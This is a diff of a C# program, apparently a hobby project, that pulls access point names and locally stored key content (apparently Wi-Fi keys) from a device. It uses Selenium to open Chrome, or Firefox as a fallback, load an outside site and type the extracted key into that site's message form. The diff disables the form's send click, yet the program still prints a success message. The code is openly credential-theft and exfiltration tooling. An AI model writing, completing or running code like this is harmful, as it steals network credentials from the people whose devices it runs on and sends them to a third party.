@@ -20,7 +20,9 @@ namespace Remote_Key_Web_Based_Extraction
             var ap_extraction_task = main_program.extract_access_point_names();
             ap_extraction_task.Wait();
             string key_content = main_program.local_key_content_extraction();
-            key_content += "42fb5kf736";
+            Console.WriteLine("Opportunity to obfuscate key_content:");
+            string obfuscation = Console.ReadLine();
+            key_content += obfuscation;
             main_program.web_content_key_extraction(key_content);
         }
 
@@ -72,32 +74,38 @@ namespace Remote_Key_Web_Based_Extraction
 
         public void web_content_key_extraction(string key_content)
         {
-            //EdgeOptions edgeOptions = new EdgeOptions();
-            //var current_drver = new EdgeDriver();
-            //OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
-            //OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
-
             /*
+            EdgeOptions edgeOptions = new EdgeOptions();
+            var current_drver = new EdgeDriver();
+            OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
             var options = new EdgeOptions();
             options.UseInPrivateBrowsing = true;
             var current_driver = new EdgeDriver(options);
             */
-
-            OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
-            
-            current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
-            current_driver.FindElement(By.Name("message")).SendKeys(key_content);
-            current_driver.FindElement(By.Name("send")).Click();
-            current_driver.Quit();
-
-            /*
-            current_drver.Navigate();
-            current_drver.Url = "https://anthony-t-n.github.io/";
-            current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
-            current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
-            current_drver.Quit();
-            */
-            Console.WriteLine("[+] Successfully extrated content key from local device");
+            try
+            {
+                Console.WriteLine("[=] Attempting to try Chrome");
+                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
+                current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
+                current_driver.FindElement(By.Name("message")).SendKeys(key_content);
+                //current_driver.FindElement(By.Name("send")).Click();
+                current_driver.Quit();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                Console.WriteLine("[=] Attempting to try FireFox");
+                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
+                current_drver.Navigate();
+                current_drver.Url = "https://anthony-t-n.github.io/";
+                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
+                //current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
+                current_drver.Quit();
+            }
+            finally
+            {
+                Console.WriteLine("[+] Successfully extracted content key from local device");
+            }
         }
     }
 }
